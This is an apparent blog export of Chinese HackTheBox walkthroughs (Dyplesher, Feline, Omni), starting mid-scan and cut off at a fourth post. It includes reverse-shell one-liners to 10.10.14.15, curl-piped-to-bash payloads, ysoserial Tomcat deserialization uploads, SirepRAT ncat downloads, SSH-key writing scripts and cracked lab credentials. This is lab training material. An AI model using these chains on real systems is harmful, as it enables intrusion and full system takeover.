content=\"Gogs\" /&gt;| &lt;meta name=\"description\" content=\"Gogs is a painless self-hosted Git service\" /&gt;| &lt;meta name=\"keywords\" content=\"go, git, self-hosted, gogs\"&gt;| &lt;meta name=\"referrer\" content=\"no-referrer\" /&gt;| &lt;meta name=\"_csrf\" content=\"n-2YIlY7SbOlxR8DIWAGFqksLx46MTU5OTEwMTUzMjU4MTk0NDM3OQ==\" /&gt;| &lt;meta name=\"_suburl\" content=\"\" /&gt;| &lt;meta proper| HTTPOptions:| HTTP/1.0 404 Not Found| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gogs=5bfa0fdb8aa700c9; Path=/; HttpOnly| Set-Cookie: _csrf=5zmuGpvQgkVMtQVmWAiCCB5pdoU6MTU5OTEwMTUzNzk5MzMzNDg5Mw%3D%3D; Path=/; Expires=Fri, 04 Sep 2020 02:52:17 GMT; HttpOnly| Date: Thu, 03 Sep 2020 02:52:17 GMT| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head data-suburl=\"\"&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt;| &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/&gt;| &lt;meta name=\"author\" content=\"Gogs\" /&gt;| &lt;meta name=\"description\" content=\"Gogs is a painless self-hosted Git service\" /&gt;| &lt;meta name=\"keywords\" content=\"go, git, self-hosted, gogs\"&gt;| &lt;meta name=\"referrer\" content=\"no-referrer\" /&gt;| &lt;meta name=\"_csrf\" content=\"5zmuGpvQgkVMtQVmWAiCCB5pdoU6MTU5OTEwMTUzNzk5MzMzNDg5Mw==\" /&gt;| &lt;meta name=\"_suburl\" content=\"\" /&gt;|_ &lt;meta4369/tcp open epmd Erlang Port Mapper Daemon| epmd-info:| epmd_port: 4369| nodes:|_ rabbit: 256725672/tcp open amqp RabbitMQ 3.7.8 (0-9)| amqp-info:| capabilities:| publisher_confirms: YES| exchange_exchange_bindings: YES| basic.nack: YES| consumer_cancel_notify: YES| connection.blocked: YES| consumer_priorities: YES| authentication_failure_close: YES| per_consumer_qos: YES| direct_reply_to: YES| cluster_name: rabbit@dyplesher| copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.| information: Licensed under the MPL. See http://www.rabbitmq.com/| platform: Erlang/OTP 22.0.7| product: RabbitMQ| version: 3.7.8| mechanisms: PLAIN AMQPLAIN|_ locales: en_US11211/tcp open memcache?25562/tcp open unknown25565/tcp open minecraft?| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:| '&#123;\"text\":\"Unsupported protocol version\"&#125;| NotesRPC:| q&#123;\"text\":\"Unsupported protocol version 0, please use one of these versions:|_ 1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x\"&#125;25672/tcp open unknown2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port3000-TCP:V=7.80%I=7%D=9/3%Time=5F505A5C%P=x86_64-apple-darwin18.6.0SF:%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:SF:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20SF:Bad\\x20Request\")%r(GetRequest,2063,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-TSF:ype:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20PaSF:th=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gogs=aa0f12ef62403SF:659;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=n-2YIlY7SbOlxR8DIWASF:GFqksLx46MTU5OTEwMTUzMjU4MTk0NDM3OQ%3D%3D;\\x20Path=/;\\x20Expires=Fri,\\xSF:2004\\x20Sep\\x202020\\x2002:52:12\\x20GMT;\\x20HttpOnly\\r\\nDate:\\x20Thu,\\x2SF:003\\x20Sep\\x202020\\x2002:52:12\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;SF:\\n&lt;head\\x20data-suburl=\\\"\\\"&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"Content-Type\\\"\\x2SF:0content=\\\"text/html;\\x20charset=UTF-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\SF:\"X-UA-Compatible\\\"\\x20content=\\\"IE=edge\\\"/&gt;\\n\\t\\n\\t\\t&lt;meta\\x20name=\\\"auSF:thor\\\"\\x20content=\\\"Gogs\\\"\\x20/&gt;\\n\\t\\t&lt;meta\\x20name=\\\"description\\\"\\x20SF:content=\\\"Gogs\\x20is\\x20a\\x20painless\\x20self-hosted\\x20Git\\x20service\\SF:\"\\x20/&gt;\\n\\t\\t&lt;meta\\x20name=\\\"keywords\\\"\\x20content=\\\"go,\\x20git,\\x20selSF:f-hosted,\\x20gogs\\\"&gt;\\n\\t\\n\\t&lt;meta\\x20name=\\\"referrer\\\"\\x20content=\\\"no-SF:referrer\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"_csrf\\\"\\x20content=\\\"n-2YIlY7SbOlxRSF:8DIWAGFqksLx46MTU5OTEwMTUzMjU4MTk0NDM3OQ==\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"_SF:suburl\\\"\\x20content=\\\"\\\"\\x20/&gt;\\n\\t\\n\\t\\n\\t\\n\\t\\t&lt;meta\\x20proper\")%r(HelSF:p,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plainSF:;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20RequestSF:\")%r(HTTPOptions,189F,\"HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\nContent-TypeSF::\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=SF:/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gogs=5bfa0fdb8aa700c9SF:;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=5zmuGpvQgkVMtQVmWAiCCBSF:5pdoU6MTU5OTEwMTUzNzk5MzMzNDg5Mw%3D%3D;\\x20Path=/;\\x20Expires=Fri,\\x200SF:4\\x20Sep\\x202020\\x2002:52:17\\x20GMT;\\x20HttpOnly\\r\\nDate:\\x20Thu,\\x2003SF:\\x20Sep\\x202020\\x2002:52:17\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt;SF:head\\x20data-suburl=\\\"\\\"&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"Content-Type\\\"\\x20coSF:ntent=\\\"text/html;\\x20charset=UTF-8\\\"\\x20/&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"X-SF:UA-Compatible\\\"\\x20content=\\\"IE=edge\\\"/&gt;\\n\\t\\n\\t\\t&lt;meta\\x20name=\\\"authoSF:r\\\"\\x20content=\\\"Gogs\\\"\\x20/&gt;\\n\\t\\t&lt;meta\\x20name=\\\"description\\\"\\x20conSF:tent=\\\"Gogs\\x20is\\x20a\\x20painless\\x20self-hosted\\x20Git\\x20service\\\"\\xSF:20/&gt;\\n\\t\\t&lt;meta\\x20name=\\\"keywords\\\"\\x20content=\\\"go,\\x20git,\\x20self-hSF:osted,\\x20gogs\\\"&gt;\\n\\t\\n\\t&lt;meta\\x20name=\\\"referrer\\\"\\x20content=\\\"no-refSF:errer\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"_csrf\\\"\\x20content=\\\"5zmuGpvQgkVMtQVmWSF:AiCCB5pdoU6MTU5OTEwMTUzNzk5MzMzNDg5Mw==\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"_subSF:url\\\"\\x20content=\\\"\\\"\\x20/&gt;\\n\\t\\n\\t\\n\\t\\n\\t\\t&lt;meta\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port25565-TCP:V=7.80%I=7%D=9/3%Time=5F505A7F%P=x86_64-apple-darwin18.6.SF:0%r(DNSVersionBindReqTCP,2A,\"\\)\\0'&#123;\\\"text\\\":\\\"Unsupported\\x20protocol\\xSF:20version\\\"&#125;\")%r(DNSStatusRequestTCP,2A,\"\\)\\0'&#123;\\\"text\\\":\\\"Unsupported\\xSF:20protocol\\x20version\\\"&#125;\")%r(SSLSessionReq,2A,\"\\)\\0'&#123;\\\"text\\\":\\\"UnsuppoSF:rted\\x20protocol\\x20version\\\"&#125;\")%r(TLSSessionReq,2A,\"\\)\\0'&#123;\\\"text\\\":\\\"USF:nsupported\\x20protocol\\x20version\\\"&#125;\")%r(LPDString,2A,\"\\)\\0'&#123;\\\"text\\\":\\SF:\"Unsupported\\x20protocol\\x20version\\\"&#125;\")%r(LDAPSearchReq,2A,\"\\)\\0'&#123;\\\"teSF:xt\\\":\\\"Unsupported\\x20protocol\\x20version\\\"&#125;\")%r(SIPOptions,2A,\"\\)\\0'&#123;\\SF:\"text\\\":\\\"Unsupported\\x20protocol\\x20version\\\"&#125;\")%r(NotesRPC,74,\"s\\0q&#123;\\SF:\"text\\\":\\\"Unsupported\\x20protocol\\x20version\\x200,\\x20please\\x20use\\x20SF:one\\x20of\\x20these\\x20versions:\\n1\\.8\\.x,\\x201\\.9\\.x,\\x201\\.10\\.x,\\x201SF:\\.11\\.x,\\x201\\.12\\.x\\\"&#125;\")%r(oracle-tns,2A,\"\\)\\0'&#123;\\\"text\\\":\\\"UnsupportedSF:\\x20protocol\\x20version\\\"&#125;\")%r(ms-sql-s,2A,\"\\)\\0'&#123;\\\"text\\\":\\\"UnsupporteSF:d\\x20protocol\\x20version\\\"&#125;\")%r(afp,2A,\"\\)\\0'&#123;\\\"text\\\":\\\"Unsupported\\x2SF:0protocol\\x20version\\\"&#125;\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 194.37 seconds 80是一个Minecraft server，前面也能看到Minecraft相关端口： 页面上给了一个test.dyplesher.htb，加host后访问 110.10.10.190 test.dyplesher.htb dyplesher.htb test.dyplesher.htb这个页面是memcache相关操作，前面也能看到有mencached相关端口： 并且很容易发现一个.git泄漏： 直接用git利用工具下载下来,得到memcached用户名密码以及相关操作代码： 1python GitHacker.py http://test.dyplesher.htb/.git/ 12345678910111213&lt;?phpif($_GET['add'] != $_GET['val'])&#123; $m = new Memcached(); $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, true); $m-&gt;setSaslAuthData(\"felamos\", \"zxcvbnm\"); $m-&gt;addServer('127.0.0.1', 11211); $m-&gt;add($_GET['add'], $_GET['val']); echo \"Done!\";&#125;else &#123; echo \"its equal\";&#125;?&gt; memcached-cli可以直接使用memcached-cli进行操作： https://www.npmjs.com/package/memcached-cli 得到几组账号密码： 123456789101112$ memcached-cli felamos:zxcvbnm@dyplesher.htbdyplesher.htb&gt; get usernameMinatoTWfelamosyuntaodyplesher.htb&gt; get password$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalSdyplesher.htb&gt; john使用john进行破解，得到一个新密码： 123sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.memcachedmommy1 Gogs3000端口是一个Gogs： 可以使用这一组账号密码登录： 1felamos@dyplesher.htb : mommy1 有两个repo，没什么东西： gitlab的release里有一个repo.zip,根据readme知道是backup： repositories repo下载下来里面是一些bundle文件： 可以把这些bundle文件复制到一个目录，然后直接去git clone： bundle_unpackclone之后查看文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263$ ls -R4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundleclone.shd4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle./4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a:LICENSE README.md src./4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/src:VoteListener.py./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce:README.md craftbukkit-1.8.jar plugins start.commandbanned-ips.json eula.txt python usercache.jsonbanned-players.json help.yml sc-mqtt.jar whitelist.jsonbukkit.yml ops.json server.properties worldcommands.yml permissions.yml spigot-1.8.jar world_the_end./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins:LoginSecurity LoginSecurity.jar PluginMetrics./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity:authList config.yml users.db./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/PluginMetrics:config.yml./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/python:pythonMqtt.py./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/world:data level.dat_mcr playerdata session.locklevel.dat level.dat_old region uid.dat./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/world/data:villages.dat villages_end.dat./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/world/playerdata:18fb40a5-c8d3-4f24-9bb8-a689914fcac3.dat./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/world/region:r.-1.0.mca r.0.0.mca./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/world_the_end:DIM1 level.dat level.dat_old session.lock uid.dat./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/world_the_end/DIM1:region./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/world_the_end/DIM1/region:r.-1.-1.mca r.-1.0.mca r.0.-1.mca r.0.0.mca./6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b:LICENSE README.md phpbash.min.php phpbash.php./d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35:LICENSE.txt README.md nightminer.py users.db12345678910$ find . -name '*.db'./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db$ sqlite3 ./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.dbSQLite version 3.30.1 2019-10-10 20:19:45Enter \".help\" for usage hints.sqlite&gt; .tablesuserssqlite&gt; select * from users;18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81 BCRYPT加密的密码，可以使用john破解： 1234567➜ Dyplesher cat user_db.hash$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6➜ Dyplesher sudo john --wordlist=/usr/share/wordlists/rockyou.txt user_db.hash...alexis1... 这组账号密码可以用于登录主站： 1felamos@dyplesher.htb : alexis1 Minecraft server现在我们进入了Minecraft server的管理页面，插件上传功能是可以使用的，可以考虑通过插件来getshell plugin插件开发资料： Portal - DEV REHBER - Minecraft İçin Eklenti Nasıl Yazılır? - Geliştirme Programları Nelerdir? - Artık Siz de Kolayca Eklenti Yazmaya Başlayabilirsiniz. | Türk Oyuncu Forumu - Gamer.Com.TRhttps://forum.gamer.com.tr/konu/dev-rehber-minecraft-icin-eklenti-nasil-yazilir-gelistirme-programlari-nelerdir-artik-siz-de-kolayca-eklenti-yazmaya-baslayabilirsiniz.445340/ Creating a plugin with Maven using IntelliJ IDEA | SpigotMC - High Performance Minecrafthttps://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/ 基本就是自己做一个恶意插件，写webshell到/var/www/test目录, 这是http://test.dyplesher.htb的目录 然后add plugin，之后reload plugin，reload这里需要指定插件名： 得到webshell： 然后通过webshell把公钥写到MinatoTW用户的authorized_keys里，ssh登录，但user.txt不在这个用户里: curl.sh123#!/bin/bashcurl -G 'http://test.dyplesher.htb/miao.php' --data-urlencode 'cmd=echo ssh-rsa pub_key &gt;&gt; /home/MinatoTW/.ssh/authorized_keys' tsharkMinatoTW在wireshark组中，可以做sniff： 1234tshark -i lo -F pcap -w captured_miao.pcap# 把抓到的包下载下来分析scp MinatoTW@dyplesher.htb:&#x2F;tmp&#x2F;captured_miao.pcap .&#x2F;captured_miao.pcap AMQP流量里得到AMQP的数据，里面有几组账号密码： 1234yuntao : EashAnicOc3OpMinatoTW MinatoTW@dyplesher.htb bihys1amFovyuntao yuntao@dyplesher.htb wagthAw4obfelamos felamos@dyplesher.htb tieb0graQueg user flag然后使用新密码可以su切换到felamos用户，得到user.txt 提权信息felamos用户目录里有个yuntao目录，里面有提示信息： yuntao用户是AMQP manager，下一步利用点，可以通过插件提权 提权 &amp; root flag就是通过rabbitmq加载插件，将我们的公钥写到root用户的authorized_keys中，注意插件需要在靶机上127.0.0.1加载： 登录root，读取root.txt: rabbitmq.py123456789101112131415161718192021222324252627''' | ~~ HackTheBox ~~ | script to load lua plugin for queuing I'm not giving password find it yourself plugin.lua must be on the box and being served via python server on port 9999 ref: https://pika.readthedocs.io/en/stable/modules/channel.html#id1'''import pikaconnection = pika.BlockingConnection( pika.ConnectionParameters( '10.10.10.190', 5672, credentials=pika.PlainCredentials('yuntao', 'EashAnicOc3Op') ))channel = connection.channel()channel.basic_publish( exchange='plugin_data', routing_key='', body='http://127.0.0.1:9999/plugin.lua')connection.close() plugin.lua123file = io.open(\"/root/.ssh/authorized_keys\", \"w\")file:write(\"ssh-rsa pub_key\")file:close() 参考资料 https://www.npmjs.com/package/memcached-cli Portal - DEV REHBER - Minecraft İçin Eklenti Nasıl Yazılır? - Geliştirme Programları Nelerdir? - Artık Siz de Kolayca Eklenti Yazmaya Başlayabilirsiniz. | Türk Oyuncu Forumu - Gamer.Com.TRhttps://forum.gamer.com.tr/konu/dev-rehber-minecraft-icin-eklenti-nasil-yazilir-gelistirme-programlari-nelerdir-artik-siz-de-kolayca-eklenti-yazmaya-baslayabilirsiniz.445340/ Creating a plugin with Maven using IntelliJ IDEA | SpigotMC - High Performance Minecrafthttps://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/ Authentication Credentials — pika 1.1.0 documentationhttps://pika.readthedocs.io/en/stable/modules/credentials.html#module-pika.credentials Introduction to Pika — pika 1.1.0 documentationhttps://pika.readthedocs.io/en/stable/intro.html HackTheBox - Dyplesherhttps://shubhkumar.in/htb/dyplesher/ Hackthebox Dyplesher Writeup - 10.10.10.190 | doctor’s bloghttps://kali-education.info/dyplesher/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Feline - HackTheBox","slug":"Feline-HackTheBox","date":"2020-09-02T07:27:34.000Z","updated":"2021-02-22T01:12:29.167Z","comments":true,"path":"2020/09/02/Feline-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/02/Feline-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/274 10.10.10.205 端口扫描1234567891011121314151617$ nmap -sC -sV 10.10.10.205Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 14:10 CSTNmap scan report for 10.10.10.205Host is up (0.068s latency).Not shown: 995 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)4567/tcp filtered tram6666/tcp open zmtp ZeroMQ ZMTP 2.07676/tcp open imqbrokerd?8080/tcp open http Apache Tomcat 9.0.27|_http-title: VirusBucketService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 60.39 seconds 8080是以个恶意软件分析平台，可以上传 CVE-2020-9484注意tomcat的版本。9.0.27，这个版本有一个反序列化漏洞，参考： CVE-2020-9484 tomcat session持久化漏洞分析与复现https://mp.weixin.qq.com/s/mHwBEHhm6_IoxHfWb9UY-A Apache Tomcat RCE by deserialization (CVE-2020-9484) - write-up and exploit - Red Timmy Securityhttps://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/ 我们可以上传恶意session，但首先需要知道要知道文件上传路径，前面报错得到的是缓存路径，不是实际路径。 文件名使用一个点，报错信息得到上传路径： exploit &amp; user flag之后就是反序列化一把梭： user.txt得到shell，读取user.txt: payload.sh12#!/bin/bashbash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1\" script.sh123456789101112#!/bin/bashjava -jar /Users/miao/Tools/ysoserial-master-SNAPSHOT.jar CommonsCollections2 \"curl 10.10.14.15:7778/payload.sh -o /tmp/payload.sh\" &gt; miao.sessioncurl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/miao' -F 'image=@miao.session'curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/miao'java -jar /Users/miao/Tools/ysoserial-master-SNAPSHOT.jar CommonsCollections2 \"chmod 777 /tmp/payload.sh\" &gt; chmod.sessioncurl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/chmod' -F 'image=@chmod.session'curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/chmod'java -jar /Users/miao/Tools/ysoserial-master-SNAPSHOT.jar CommonsCollections2 \"bash /tmp/payload.sh\" &gt; bash.sessioncurl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/bash' -F 'image=@bash.session'curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/bash' one.sh也可以直接一次session得到shell，只要针对java的Runtime.exec进行编码即可： 123456#!/bin/bashcmd=\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1'\"command=\"bash -c &#123;echo,$(echo -n $cmd | base64)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\"java -jar /Users/miao/Tools/ysoserial-master-SNAPSHOT.jar CommonsCollections4 \"$command\" &gt; ./one.sessioncurl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/one' -F 'image=@one.session'curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/one' 信息搜集查看端口发现本地两个端口，4505和4506: 12345netstat -anp...tcp 0 0 127.0.0.1:4505 0.0.0.0:* LISTEN -tcp 0 0 127.0.0.1:4506 0.0.0.0:* LISTEN -... 搜索相关信息知道是saltstack，存在一个漏洞CVE-2020-11651 端口转发传个socat上去，进行端口转发： 123wget 10.10.14.15:7778/socatchmod +x socat./socat TCP-LISTEN:4609,fork,reuseaddr TCP:127.0.0.1:4506 exploit https://github.com/jasperla/CVE-2020-11651-poc 然后就是exp直接打： 1python3 exploit.py --master 10.10.10.205 --port 4609 --exec \"curl 10.10.14.15:7778/payload1.sh | bash\" 得到docker容器的root： payload1.sh12#!/bin/bashbash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.15/4445 0&gt;&amp;1\" 提权信息发现一个/var/run/docker.sock，容器可以通过这个socket来跟宿主机的docker服务通信： 之后就是可以通过api，也可以直接把宿主机的docker二进制文件传到容器内操作 提权1234567891011121314# 宿主机tomcat@VirusBucket:/usr/bin$ python3 -m http.server 6789# 容器内wget 172.17.0.1:6789/dockerchmod +x dockerpython3 -c 'import pty; pty.spawn(\"/bin/sh\")'./docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandbox latest a24bb4013296 3 months ago 5.57MB&lt;none&gt; &lt;none&gt; 188a2704d8b0 4 months ago 1.06GB./docker run -v /root:/mnt -it sandbox root flag 挂载目录读取root.txt: 参考资料 CVE-2020-9484 tomcat session持久化漏洞分析与复现https://mp.weixin.qq.com/s/mHwBEHhm6_IoxHfWb9UY-A Apache Tomcat RCE by deserialization (CVE-2020-9484) - write-up and exploit - Red Timmy Securityhttps://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/ http://www.jackson-t.ca/runtime-exec-payloads.html https://github.com/jasperla/CVE-2020-11651-poc [HTB] Write-up : Feline Machine | Hackingdomhttps://hackingdom.io/2020/08/30/htb-writeup-feline/ [HTB] Feline · 5p4d37’s Bloghttps://d.oulove.me/2020/08/31/HTB-Feline/ Feline - YouTubehttps://www.youtube.com/watch?v=jvM4mkHng18","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Omni - HackTheBox","slug":"Omni-HackTheBox","date":"2020-09-02T05:27:47.000Z","updated":"2021-01-11T00:43:30.815Z","comments":true,"path":"2020/09/02/Omni-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/02/Omni-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/271 10.10.10.204 端口扫描135,8080: 123456789101112131415161718$ nmap -Pn -sC -sV 10.10.10.204Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 14:12 CSTNmap scan report for 10.10.10.204Host is up (0.069s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC8080/tcp open upnp Microsoft IIS httpd| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=Windows Device Portal|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Site doesn't have a title.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 33.32 seconds 8080Windows Device Portal,需要登录： 看起来是个windows IOT，搜索资料： Windows 10 IoT Core远程命令执行漏洞验证及建议 - FreeBuf网络安全行业门户https://www.freebuf.com/articles/web/199292.html 可以直接使用： https://github.com/SafeBreach-Labs/SirepRAT SirepRATdownload ncat任意执行命令，例如下载文件: 1python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \"/c powershell Invoke-Webrequest -OutFile C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\nc64.exe -Uri http://10.10.14.15:7778/ncat.exe\" --v reverse shell使用nc反弹shell： 1python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \"/c C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\nc64.exe 10.10.14.15 4444 -e powershell.exe\" --v whoami报错，可以使用$env:UserName 搜集信息 在这个目录发现一个bat文件，这个文件中有两组账号密码： 12cd \"c:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement\"ls -force r.bat1234567891011121314@echo off:LOOPfor /F \"skip=6\" %%i in ('net localgroup \"administrators\"') do net localgroup \"administrators\" %%i /deletenet user app mesh5143net user administrator _1nt3rn37ofTh1nGzping -n 3 127.0.0.1clsGOTO :LOOP Windows Device Portal回到8080的web，可以使用app:mesh5143登录： reverse shellProcess -&gt; run command: 1C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.15 4445 -e powershell.exe 得到app用户shell： user flagapp用户可以读取user.txt,同样需要通过powershell去读： 12$credential = Import-CliXml -Path U:\\Users\\app\\user.txt$credential.GetNetworkCredential().Password root flag前面bat文件里我们得到了两组密码，administrator也是同样流程，登录8080，执行命令，反弹shell，读取root.txt: 123456administrator _1nt3rn37ofTh1nGzC:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.15 4446 -e powershell.exe$credential = Import-CliXml -Path U:\\Users\\administrator\\root.txt$credential.GetNetworkCredential().Password 参考资料 Windows 10 IoT Core远程命令执行漏洞验证及建议 - FreeBuf网络安全行业门户https://www.freebuf.com/articles/web/199292.html https://github.com/SafeBreach-Labs/SirepRAT HACK THE BOX - Omni 10.10.10.204 [Writeup/Walkthrough]https://hacktheboxwriteups.blogspot.com/2020/08/omni.html Omni - YouTubehttps://www.youtube.com/watch?v=hC4iqMpqt-s","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Intense - 